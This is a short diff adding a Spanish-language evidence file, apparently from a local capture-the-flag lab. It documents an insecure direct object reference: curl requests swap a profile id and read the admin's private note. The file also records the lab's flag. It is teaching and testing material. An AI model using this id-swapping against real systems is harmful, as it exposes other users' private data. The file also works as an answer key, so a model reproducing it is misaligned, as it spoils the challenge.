@@ -1,0 +1,12 @@
+# R5 — IDOR · evidencia (Guadalupe)
+# Target server.py del Lab 07 corrido local en /app (phantomcorp -> 127.0.0.1:80), caja negra.
+# Fecha: 2026-11-20T22:41:52Z UTC
+
+$ curl -s 'http://phantomcorp/perfil?id=3'   # mi propio perfil (sesion jperez, id=3)
+{"id": 3, "user": "jperez", "rol": "user", "nota_privada": "Nota de Juan: acordarse de renovar cert."}
+
+$ curl -s 'http://phantomcorp/perfil?id=1'   # perfil ajeno: admin
+{"id": 1, "user": "admin", "rol": "admin", "nota_privada": "Nota del admin: FLAG{idor_broken_access}"}
+
+# El servidor devuelve el perfil ajeno sin verificar que id=1 pertenezca al usuario de la sesion.
+# Flag en la nota privada del admin: FLAG{idor_broken_access} (sha256 verificado contra retos.manifest).
